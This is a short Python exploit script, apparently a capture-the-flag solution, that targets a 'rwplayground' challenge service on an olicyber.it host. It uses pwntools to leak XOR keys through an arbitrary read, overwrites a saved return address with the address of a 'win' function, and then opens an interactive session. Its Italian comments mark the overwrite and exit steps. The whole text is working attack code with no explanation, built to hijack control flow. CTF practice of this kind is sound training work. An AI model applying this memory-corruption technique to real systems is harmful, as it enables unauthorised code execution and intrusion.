from pwn import *
r=remote("rwplayground.challs.olicyber.it", 38051)
bssadd=0x4040C0
winadd=0x401397
writekeyadd=0x4040B8
r.recvuntil(b'you... ')
baseadd=int(r.recvline(drop=True).decode(),16)
retadd=baseadd+20
r.sendline(b'1')
r.recvline()
r.sendline(hex(bssadd).encode())
r.recvuntil(b'value: ')
readkey=r.recvline(drop=True).decode()
r.sendline(b'1')
r.sendline(hex(writekeyadd).encode())
r.recvuntil(b'value: ')
writekey=(int(r.recvline(drop=True),16)^int(readkey,16))
r.sendline(b'2')#sovrascrivo ret add
r.sendline(hex(retadd))
r.sendline(hex(winadd^writekey).encode())
r.sendline(b'4')#esco
r.interactive()